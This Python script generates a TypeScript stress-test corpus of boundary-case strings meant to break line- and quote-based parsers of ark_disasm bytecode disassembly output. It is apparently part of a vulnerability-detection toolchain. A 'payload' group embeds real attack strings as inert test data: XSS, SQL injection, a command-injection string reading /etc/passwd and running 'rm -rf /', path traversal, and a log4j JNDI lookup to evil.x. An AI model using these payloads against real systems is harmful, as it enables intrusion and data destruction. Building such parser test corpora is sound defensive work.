#!/usr/bin/env python3
"""生成字符串边界压力源文件（feat_api/src/main/ets/pages/lang/StringStressLab.ts）。

背景（SDK26 es2abc + ark_disasm 实证，探针见 docs/history/BENCHMARK_ROUNDS.md〈字符串边界语料〉等轮）：
ark_disasm 文本输出对字符串只做「部分转义」——反斜杠与 \x01-\x1f 中的多数控制字符、U+2028 等转成转义文本，
但 **双引号、换行 \n、回车 \r、制表符 \t 原样裸输出**（\t 裸输出使字符串续行可与真指令行「\t+操作码」完全同形）；
代理对按 MUTF-8(CESU-8) 裸字节写出，会使整个 .dis 文件不再是合法 UTF-8。
下游按行/按引号切分的文本解析器因此存在结构性风险。

本语料把全部边界形态同时压入 ark_disasm 输出的三个解析面：
  ① METHODS 段指令操作数：lda.str "..."、stobjbyname/ldobjbyname "key"（引号配对被内嵌 " 破坏，
     内嵌 \\n 把后续内容伪装成指令行 / L_ESSlotNumberAnnotation: 方法边界 / # xx ==== 段分隔符）；
  ② LITERALS 段字面量：createarraywithbuffer/createobjectwithbuffer 的 string:"..."（同上 + 元素按逗号切分）；
  ③ STRING 段字符串池：[offset:0x.., name_value:裸值]（无引号；内嵌 \\n 换行重组，
     值内出现 "\\n[offset:" 会伪造下一条池条目，"# xx ====================" 会伪造段结束）。

用例分组：引号族 / 反斜杠族 / 换行回车族 / 转义文本与真实字符碰撞 / MUTF-8 与 Unicode /
池条目伪造 / 方法体伪造 / 段分隔伪造 / record 伪造 / 操作数分支矩阵（", 相邻、连引号、
字面 "\\ 序列、label/.catchall/.function 变体伪造）/ 超长 / 近重复（池去重+strip 边界）/
现实漏洞载荷（XSS、SQLi、log4j、HTTP CRLF 等）/ 乱炖组合。

指令面可达性说明（es2abc 实测）：字符串操作数指令中 lda.str / stobjbyname / ldobjbyname /
throw.undefinedifholewithname 可由语料定向触发；tryldglobalbyname/stglobalbyname 的操作数
只能是合法标识符（内容不可恶劣化）；newlexenvwithname 名字数组在当前 SDK 闭包形态下不可达
（闭包走无名 newlexenv），其 literal 数组解析路径由数组/对象字面量组等价覆盖。

用法：python3 tools/gen_string_stress.py   （在 ohosVulDetect 子模块根目录执行）
生成后由 pages/lang/RuntimeDemo.ets 挂载（防 tree-shake 并做运行时校验和验证）。
"""
import argparse
import pathlib

HEADER = "// 本文件由 tools/gen_string_stress.py 生成，勿手改。"

# ---------------- TS 字面量编码：内容 -> 双引号字面量源码 ----------------

def enc(s: str) -> str:
    """Python 内容串 -> TS 双引号字面量内部文本。
    控制字符/代理对/BOM/U+2028-9 输出为 \\uXXXX 转义（源码保持可读、可 diff）；
    其余非 ASCII（CJK/emoji 等）按字面输出——两种源码形态在 ark_disasm 输出侧行为不同，均需覆盖。"""
    out = []
    for ch in s:
        o = ord(ch)
        if ch == "\\":
            out.append("\\\\")
        elif ch == '"':
            out.append('\\"')
        elif ch == "\n":
            out.append("\\n")
        elif ch == "\r":
            out.append("\\r")
        elif ch == "\t":
            out.append("\\t")
        elif o < 0x20 or o == 0x7F or 0xD800 <= o <= 0xDFFF or o in (0xFEFF, 0x2028, 0x2029):
            out.append(f"\\u{o:04x}")
        else:
            out.append(ch)
    return "".join(out)


def build_cases() -> list[tuple[str, str]]:
    """(内容, 分组说明)。内容即运行期真实字符串。"""
    c: list[tuple[str, str]] = []
    add = lambda s, g: c.append((s, g))

    # ---- 基础边界 ----
    add("The quick brown fox jumps", "basic")
    add("", "basic")
    add(" ", "basic")
    add("   ", "basic")
    add("  padded  ", "basic")
    add("]", "basic")
    add("a\x00b", "basic")   # NUL：MUTF-8 裸字节，全文件非法 UTF-8
    add("]}", "basic")
    add("] ] ]", "basic")

    # ---- 引号族：ark_disasm 不转义 " ----
    add('"', "quote")
    add('""', "quote")
    add('"""', "quote")
    add("'", "quote")
    add("`", "quote")
    add("\"'`", "quote")
    add('say "hi" ok', "quote")
    add("it's `tick`", "quote")
    add('"quoted"', "quote")
    add('{"k":"v","n":[1,2]}', "quote")
    add('select * from t where name=\'a\'\'b\' and c="d"', "quote")
    add('<a href="x" onclick=\'go("y")\'>', "quote")
    add('a"\nb\'\nc`', "quote")
    add('"' * 50, "quote")

    # ---- 反斜杠族：ark_disasm 会转义 \\，转义文本与真实字符需可区分 ----
    add("back\\slash", "backslash")
    add("double\\\\slash", "backslash")
    add("end\\", "backslash")
    add("a\\nb", "backslash")          # 内容=反斜杠+n 两字符
    add('a\\"b', "backslash")
    add("C:\\Users\\koki\\temp", "backslash")
    add("\\\\server\\share\\", "backslash")
    add("\\u0041", "backslash")
    add("\\x41", "backslash")
    add("\\${jndi}", "backslash")
    add('(\\d+)\\s*"[x]"', "backslash")
    add('\\n\\r\\t\\"\\\\', "backslash")

    # ---- 换行/回车族：\n \r 裸输出，行级解析器主要攻击面 ----
    add("line1\nline2", "newline")
    add("\nstart", "newline")
    add("end\n", "newline")
    add("\n\n\n", "newline")
    add("\n" * 100, "newline")
    add("cr\rmid", "newline")
    add("\rstart", "newline")
    add("end\r", "newline")
    add("crlf\r\nend", "newline")
    add("lf\n\rend", "newline")
    add("a\r\n\r\nb", "newline")
    add("a\n\t b\r\n c\n", "newline")

    # ---- 转义文本 vs 真实字符碰撞（round-trip 必须不混淆）----
    add("a\tb", "escape-collision")
    add("a\\tb", "escape-collision")
    add("a\x01b", "escape-collision")
    add("a\\x01b", "escape-collision")
    add("a\u2028b", "escape-collision")
    add("a\u2029b", "escape-collision")
    add("a\ufeffb", "escape-collision")
    add("a\x7fb", "escape-collision")
    add("a\\u2028b", "escape-collision")
    add("\x07\x0c\x0b", "escape-collision")
    add("\x1b[0m\x1b[31mRED\x1b[0m", "escape-collision")

    # ---- MUTF-8 / Unicode：代理对裸 CESU-8 字节 -> .dis 非法 UTF-8 ----
    add("中文测试汉字标点", "unicode")
    add("emoji😀🀄𝕏末", "unicode")
    add("x\ud800y", "unicode")            # 孤立高代理（源码必为转义形态）
    add("x\udfffy", "unicode")            # 孤立低代理
    add("\U0001f600pair", "unicode")     # 解码码点形态（😀；工具侧合法代理对重组语义见门禁 _recombine_pairs 保险丝）
    add("e\u0301na\u0308ive", "unicode")
    add("a\u00a0b", "unicode")
    add("a\u200bb\u200dc", "unicode")
    add("evil\u202edrow-ssa\u202c", "unicode")
    add("“”‘’「」『』【】", "unicode")
    add("中“文”\n日『本』", "unicode")

    # ---- STRING 池条目伪造（值内 \n[offset: 伪造下一条；name_value: 前缀）----
    add("multi\n[offset:0x1, name_value:x]tail", "pool-spoof")
    add("\n[offset:0x9, name_value:zz]", "pool-spoof")
    add("head\n[offset:0x0, name_value:]", "pool-spoof")
    add("[offset:0x123, name_value:sink]", "pool-spoof")
    add("name_value:v", "pool-spoof")
    add("a, b: c, d: e", "pool-spoof")

    # ---- literal 起始行伪造（值内伪造 LITERALS 段条目形态，攻击 literal 分块与闭合扫描）----
    add('fake\n0 0x590 { 2 [ string:"x", null_value:0, ]}', "lit-spoof")
    add("fake\n1 0x1 { ", "lit-spoof")
    add('fake\n2 0x2 { 3 [ string:"m", method:f, method_affiliate:0, ]}', "lit-spoof")
    add("fake\n999999 0xdeadbeef { 999 [ ", "lit-spoof")

    # ---- METHODS 段伪造（\n 后伪造指令行 / 方法边界 / .function 头）----
    add("fake\nL_ESSlotNumberAnnotation:", "method-spoof")
    add("L_ESSlotNumberAnnotation:", "method-spoof")
    add("pre\n\tsta v0\n\tldai 0x0", "method-spoof")
    add('x\n\tlda.str "y"', "method-spoof")
    add('x\n\tldobjbyname 0x0, "k"', "method-spoof")
    add("pre\n.function any evil(any a0) {", "method-spoof")
    add("pre\n.language ECMAScript", "method-spoof")
    add("body\n}\nafter", "method-spoof")

    # ---- 段分隔符伪造（# xx ====... / endswith("====") 判定）----
    add("sec\n# STRING ====================", "section-spoof")
    add("sec\n# RECORDS ====================", "section-spoof")
    add("sec\n# ====================", "section-spoof")
    add("sec\n# LITERALS\n# METHODS", "section-spoof")
    add("x=====================y", "section-spoof")
    add("# LITERALS", "section-spoof")

    # ---- RECORDS 段伪造 ----
    add("rec\n.record evil {\n}", "record-spoof")
    add("fld\n.field any x, <0x1>", "record-spoof")

    # ---- 超长（行重组/缓冲）----
    add('q"b\\n\tr,' * 256, "long")
    add("汉" * 500, "long")
    add("%s" % ("ab" * 1024), "long")

    # ---- 近重复（池去重与首尾空白边界）----
    add("a", "near-dup")
    add("a", "near-dup")          # 完全重复：池应去重，操作数处重复
    add("a ", "near-dup")
    add(" a", "near-dup")
    add("a\n", "near-dup")
    add("aa", "near-dup")

    # ---- 现实漏洞载荷（兼顾漏洞检测侧语料）----
    add('<img src=x onerror="alert(\'XSS\')">', "payload")
    add("1' OR '1'='1' --", "payload")
    add("; cat /etc/passwd & rm -rf /", "payload")
    add("../../etc/passwd%00.png", "payload")
    add("${jndi:ldap://evil.x/a}", "payload")
    add("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpM", "payload")
    add('https://x.io/a?b=1&c="d"&e=\'f\'', "payload")
    add("Failed %{public}s cause: %{public}s", "payload")
    add('<?xml v="1.0"?><n a="b\'c"/>', "payload")
    add('k: "v"\n  - \'w\'\n# cmt', "payload")
    add('HTTP/1.1 200 OK\r\nSet-Cookie: a="b"\r\n\r\nbody', "payload")
    add('# Title\n> quote "x"\n- item `y`\n', "payload")
    add("0K5t9qQ2Xz7vBn4hR8wL3jF6uM1cA7dE5gT+4iY0sP==", "payload")

    # ---- 操作数分支矩阵：", 相邻 / 连引号 / 字面转义序列 / label 与 catchall 伪造 ----
    # 针对下游 find_next_delimiter 类函数的引号配对分支：", lookahead 特判、连引号特判、
    # 字面 "\ 序列特判，以及方法段 label/.catchall/.function 变体伪造。
    add('", lead', "operand-branch")
    add('trail ,"', "operand-branch")
    add('a ," b', "operand-branch")
    add('",', "operand-branch")
    add('""""', "operand-branch")
    add('"""""', "operand-branch")
    add('""""""', "operand-branch")
    add('"\\"', "operand-branch")            # 内容 = " \ " 三字符（引号+反斜杠+引号）
    add('""\\"""', "operand-branch")         # 内容 = " " \ " " 五字符
    add('"\\\\"', "operand-branch")          # 内容 = " \ \ " 四字符
    add('pre\njump_label_0:', "operand-branch")
    add('x\njump_label_1:\npost', "operand-branch")
    add('body\n.catchall\nmore', "operand-branch")
    add('pre\n.function any n.e.f(any a0) <static> {', "operand-branch")
    add('pre\n.function any f(any a0, any a1) {', "operand-branch")
    add('lab\n\tldai 0x1\n\tjnez jump_label_9', "operand-branch")

    # ---- 指令续行伪装（lda.str 跨行操作数，续行命中真实指令语法谱系）----
    # 机理：字符串含 \n 使 lda.str 操作数跨行，续行以 \t 开头即与真指令行同形；
    # 逐形态覆盖寄存器/立即数/带引号操作数/标签/方法闭括号/literal 元素行/wide 变体。
    add('x\n\tlda.str "in\\"ner"\ny', "inst-mimic")            # 嵌套引号串
    add('x\n\tlda.str ""\ny', "inst-mimic")                     # 嵌套空串
    add('pre\n\tsta v0\n\tldai 0x2a\npost', "inst-mimic")     # 寄存器+立即数
    add('x\n\tldobjbyname 0x0, "code"\ny', "inst-mimic")        # imm+引号串操作数
    add('x\n\tstobjbyname 0x1, "a, b"\ny', "inst-mimic")        # 引号内逗号操作数
    add('x\n\tcallthis1 0x7, v13, v14\ny', "inst-mimic")        # 多寄存器调用
    add('x\n\tjnez jump_label_3\n\tjmp jump_label_4\ny', "inst-mimic")
    add('x\njump_label_5:\ny', "inst-mimic")                     # 0 列标签行
    add('x\n\tthrow.undefinedifholewithname "h"\ny', "inst-mimic")
    add('x\n\tnewlexenv 0x3\ny', "inst-mimic")
    add('x\n\tmov v0, a0\ny', "inst-mimic")                     # 寄存器间 mov（参数名 a0 同形）
    add('x\n\treturnundefined\npost', "inst-mimic")
    add('x\n\tldexternalmodulevar 0x1\ny', "inst-mimic")
    add('x\n\ttryldglobalbyname 0x4, "JSON"\ny', "inst-mimic")
    add('x\n\tcreateobjectwithbuffer 0x6, { 4 [ string:"k", string:"v", ]}\ny', "inst-mimic")
    add('x\n.catchall:begin, end, target\ny', "inst-mimic")      # 异常区间行
    add('x\n\twide.ldlexvar 0x80, 0x81\ny', "inst-mimic")       # wide 变体
    add('x\n\tsuspendgenerator 0x0, v0, v1\ny', "inst-mimic")
    add('x\n  string:"fake", i32:42, ]}\ny', "inst-mimic")       # literal 元素行（LITERALS 面伪装）
    add('a\n\tsta v0\n\tlda v0\n\tjnez jump_label_9\njump_label_9:\n\treturnundefined\nz', "inst-mimic")

    # ---- tab 前缀续行截断族（真实缺陷复现组，2026-09-14 A1 用例扩展）----
    # 机理：下游 find_line_end 类「下一条指令开始」启发式把「\t 开头 + 首词 [a-zA-Z0-9.]*」的
    # 续行误判为指令行，lda.str 操作数在首个此类续行处被截断；截断后 rfind('"') 回落到
    # 开引号（操作数变空串）或内容内引号（操作数=错误前缀），残留行再被当作指令解析——
    # 带未闭合引号的残留行会触发幽灵指令的 64 行吞噬，裸 "}" 残留行会把方法体整体截断。
    # 真实世界来源：Flow invariant 消息（第三方 JS 库多行报错文案，含 \n\t\t 缩进续行）。
    add('Flow invariant is violated:\n\t\tEmission from another coroutine is detected.\n', "tab-break")
    add('Flow invariant is violated:\n\tEmission from another coroutine is detected.\n', "tab-break")
    add('A1 mirror: emission precedes\n\t\tEmission from another coroutine is detected.\n\tsta v0\n', "tab-break")
    add('start\n\t42digits then words\n', "tab-break")       # \t+数字词首（regex 命中）
    add('start\n\t.dotPrefixed tail\n', "tab-break")         # \t+点词首（regex 命中）
    add('start\n\t\nmiddle\n', "tab-break")                  # 裸 tab 行（strip 后空串仍命中 regex）
    add('start\n\t\r\nmid\n', "tab-break")                   # tab+CR 续行
    add('pre"quote\n\tword\n', "tab-break")                  # 截断点前有引号：操作数=静默错误前缀
    add('a\n\t\t\tdeep tab indent\nb', "tab-break")          # 三重 tab 词首续行
    add('x\n\tsta v0\n\treturnundefined\n', "tab-break")     # 多行 tab 指令形态 + 尾部 \n（闭引号独行）
    add('x\n\tldobjbyname 0x0, "k\n', "tab-break")           # 残留行带不闭合引号：幽灵指令 64 行吞噬
    add('plain\ntext\n}\nafter', "tab-break")                # 裸 "}" 残留行：方法体截断面
    add('head\n\tlda.str ""\n\treturnundefined\n', "tab-break")
    add('\n\tTabs lead\t\n\tand trail\n', "tab-break")

    # ---- closer-guard：闭行判据修复面 + 文本级歧义行为锁（2026-09-15）----
    # 预期形态（闭引号行后紧邻 .catchall/.catch）需 es2abc 生成异常区域指令，实测本 SDK 对
    # 不可失败 try/catch 消除区域（stringStressAt 内 0 条 .catch 指令）、可保留场景区域指令
    # 固定落位方法尾（handler 后）——紧邻形态在本工具链不可达，归因记录；本用例退化为
    # try 上下文等价的多行恢复用例（指令形态续行 + 非换行结尾，与 ad84a0f 修复面同域）。
    add('x\n\tsta v0\nq', "closer-guard")
    # 用例 2：文本级根本歧义——首物理行行尾引号 + 紧随指令形态行，与「操作数已正常闭合 + 真指令」
    # 逐字节同形；解析器取「已闭合」解释：操作数='p'，\tsta v0 成真指令，q" 为 skip payload
    # residue line。行为由门禁 KNOWN_LIMITATIONS 精确锁定（双向漂移均红灯）。
    add('p"\n\tsta v0\nq', "closer-guard")

    # ---- 歧义矩阵：内容首段行尾形态 × 紧随行形态 系统化（2026-09-15 P1）----
    # 模板 f'{A}\n{B}\ntail'：A 行尾形态决定解析器是否提前闭合（引号行尾 = 歧义触发），
    # B 行形态决定提前闭合后的残留走向（真指令/标签/异常区域/方法尾/段标记）。
    # 首轮无锁入语料，门禁 MISSING/EXTRA 实证各组合真实行为后，截短者入 KNOWN_LIMITATIONS。
    _amb = [
        ('p"', '\tsta v0'), ('p"', '\tldobjbyname 0x0, "k"'), ('p"', 'return'),
        ('p"', 'jump_label_0:'), ('p"', '.catchall'), ('p"', '}'),
        ('p"', '# STRING ===================='),
        ('p', '\tsta v0'), ('p', '.catchall'), ('p', '}'),
        ('p""', '\tsta v0'), ('p""', '.catchall'),
        ('p\\', '\tsta v0'), ('p\\', '# STRING ===================='),
    ]
    for _a, _b in _amb:
        add(f'{_a}\n{_b}\ntail', "ambiguity-matrix")

    # ---- C0 控制字符全扫（\x02-\x0c、\x0e-\x1f 逐码点，池+操作数双面系统化）----
    for _cp in list(range(0x02, 0x0d)) + list(range(0x0e, 0x20)):
        add(chr(_cp), "c0-sweep")

    # ---- 空串专项（空键/空模板块，指令操作数面的空串形态由 EmptyShapes 函数承载）----
    add("", "empty-operand")

    # ---- 乱炖组合 ----
    add('{"k":"v"}\n# STRING ====================\n😀tail', "combo")
    add("multi\n[offset:0x1, name_value:x]\r\nevil\u202ex\u202c", "combo")
    add('a"b\\c\td\ne\rf"g`h', "combo")
    return c


# 对象字面量键位子集：键需唯一，取最具破坏力的形态（引号/换行/池伪造/全角等）
KEY_SUBSET_GROUPS = ("quote", "newline", "pool-spoof", "section-spoof", "unicode", "backslash")


def pick_keys(cases: list[tuple[str, str]]) -> list[str]:
    seen: set[str] = set()
    keys: list[str] = []
    for content, group in cases:
        if group not in KEY_SUBSET_GROUPS or content in seen or not content:
            continue
        seen.add(content)
        keys.append(content)
        if len(keys) >= 24:
            break
    if len(keys) < 8:  # 理论不可达，防御
        raise RuntimeError("nasty key subset too small")
    return keys


def gen(out: pathlib.Path) -> int:
    cases = build_cases()
    keys = pick_keys(cases)
    n = len(cases)
    # 歧义矩阵用例拆独立函数：stringStressAt 的 if-chain CFG 随用例数线性增长，
    # 越过工具链 lift 容量阈值后 TAC dump 从中间截断（2026-09-15 实测 216 用例止于 351 块）；
    # 拆函数把每函数 CFG 规模压回安全区。
    main_cases = [(c, g) for c, g in cases if g != "ambiguity-matrix"]
    mat_cases = [(c, g) for c, g in cases if g == "ambiguity-matrix"]
    n_main = len(main_cases)

    def ts_main(i: int) -> str:
        return f'"{enc(main_cases[i][0])}"'

    def ts_mat(i: int) -> str:
        return f'"{enc(mat_cases[i][0])}"'

    lines: list[str] = [
        HEADER,
        "// 字符串边界语料：把引号/换行/回车/代理对/伪造 ark_disasm 文本结构等全部边界形态",
        "// 同时压入三个解析面：方法体指令操作数（lda.str / stobjbyname）、字面量缓冲",
        "// （createarraywithbuffer / createobjectwithbuffer 的键与值）、字符串池。",
        f"// 共 {n} 个用例；预期故障模式与实证依据见 tools/gen_string_stress.py 文档字符串。",
        f"export const STRING_STRESS_CASES: number = {n};",
        f"export const MAT_CASES: number = {len(mat_cases)};",
        "",
        "// 面①：方法体 lda.str 操作数（歧义矩阵组拆至 stringStressMatrix，防 lift 容量截断）。",
        "export function stringStressAt(i: number): string {",
    ]
    for i in range(n_main):
        lines.append(f"  if (i === {i}) {{ return {ts_main(i)}; }}")
    lines += [
        f"  if (i === {n_main}) {{",
        "    // 门禁防线：非字面量 return 路径——return v9（无引号）不得开启操作数收集区产出幻影操作数",
        '    const derived = "closer-guard-derived" + i;',
        "    return derived;",
        "  }",
        '  return "string-stress-fallback";',
        "}",
        "",
        "// 面①b：歧义矩阵组（独立函数防 lift 容量截断，见 gen 头注释）。",
        "export function stringStressMatrix(i: number): string {",
    ]
    for i in range(len(mat_cases)):
        lines.append(f"  if (i === {i}) {{ return {ts_mat(i)}; }}")
    lines += [
        '  return "matrix-stress-fallback";',
        "}",
        "",
        "// 面②a：数组字面量缓冲（含全部用例）。",
        "export function stringStressArray(): Array<string> {",
        "  return [",
    ]
    for i in range(n_main):
        lines.append(f"    {ts_main(i)},")
    for i in range(len(mat_cases)):
        lines.append(f"    {ts_mat(i)},")
    lines += [
        "  ];",
        "}",
        "",
        "// 面②b：对象字面量缓冲（恶劣键位子集 + 值），键与值都进字面量段。",
        "export function stringStressObject(): Record<string, string> {",
        "  return {",
    ]
    for k in range(len(keys)):
        v = f'"k{chr(97 + k % 26)}{k}v"'
        key_txt = f'"{enc(keys[k])}"'
        lines.append(f"    {key_txt}: {v},")
    lines += [
        "  };",
        "}",
        "",
        "// 面①补：stobjbyname/ldobjbyname 的字符串操作数（动态键读写，覆盖 \", 相邻与连引号键）。",
        "export function stringStressFields(): string {",
        '  const o: Record<string, string> = {};',
        '  o[\'a"b\'] = \'v"x\';',
        "  o['k\\\\n'] = 'v\\\\y';",
        "  o['k\\n'] = 'v\\nz';",
        "  o['k\\n\\tv'] = 'tab-key';",
        "  o['}\\n'] = 'brace-key';",
        '  o["[offset:0x1, name_value:x]"] = "pool";',
        "  o[',k'] = 'comma-key';",
        "  o['\"\"\"\"'] = 'quad-key';",
        "  o['jump_label_0:'] = 'label-key';",
        "  o['.catchall'] = 'catchall-key';",
        "  let s = '';",
        "  for (const k in o) {",
        "    s += k.length > 0 ? o[k] : '';",
        "  }",
        "  return s + o[''] + o[',k'] + o['jump_label_0:'];",
        "}",
        "",
        "// 空 key 对象字面量（literal string:\"\" 空键）+ 空块模板（cooked/raw 空串）。",
        "export function stringStressEmptyShapes(x: number): string {",
        "  const emptyKey: Record<string, number> = { '': 1, 'a': 2 };",
        "  const chunked = `pre${x}suf`;",
        "  const emptyChunks = `${x}`;",
        "  return `ek=${emptyKey['']} c0=${chunked.length} c1=${emptyChunks.length}`;",
        "}",
        "",
        "// 面①补：throw.undefinedifholewithname（捕获变量洞检查，单字符串操作数形态）。",
        "export function stringStressLexenv(base: number): number {",
        "  const a = base + 1;",
        "  const b = base + 2;",
        "  const c = base + 3;",
        "  const pick = (): number => a + b + c;",
        "  return pick();",
        "}",
        "",
        "// 模板字面量块（含引号/换行/制表/反斜杠块 + 插值）。",
        "export function stringStressTpl(seed: number): string {",
        '  return `head "q"\\nmid\\t${seed}tail\\\\end\\r`;',
        "}",
        "",
        "// 运行时校验和：遍历全部形态，返回 计数/总长/字符码累加（值正确性由 sweep ✅ 行核对）。",
        "export function stringStressChecksum(): string {",
        "  const arr = stringStressArray();",
        "  const obj = stringStressObject();",
        "  let cnt = 0;",
        "  let len = 0;",
        "  let acc = 0;",
        "  for (const s of arr) {",
        "    cnt += 1;",
        "    len += s.length;",
        "    for (let j = 0; j < s.length; j++) {",
        "      acc = (acc + s.charCodeAt(j) * (j % 7 + 1)) % 1000000007;",
        "    }",
        "  }",
        "  for (const k in obj) {",
        "    cnt += 1;",
        "    len += k.length + obj[k].length;",
        "  }",
        "  for (let i = 0; i < STRING_STRESS_CASES - MAT_CASES; i++) {",
        "    cnt += 1;",
        "    len += stringStressAt(i).length;",
        "  }",
        "  for (let i = 0; i < MAT_CASES; i++) {",
        "    cnt += 1;",
        "    len += stringStressMatrix(i).length;",
        "  }",
        "  len += stringStressFields().length;",
        "  len += stringStressLexenv(cnt);",
        "  len += stringStressTpl(cnt).length;",
        "  return `n=${cnt} len=${len} acc=${acc}`;",
        "}",
        "",
    ]
    out.write_text("\n".join(lines), encoding="utf-8")
    return n


def main() -> int:
    ap = argparse.ArgumentParser(description="generate string boundary stress source")
    ap.add_argument("--outdir", default="feat_api/src/main/ets/pages/lang", help="输出目录（相对子模块根）")
    args = ap.parse_args()
    outdir = pathlib.Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    n = gen(outdir / "StringStressLab.ts")
    print(f"generated: {outdir / 'StringStressLab.ts'} (cases={n})")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
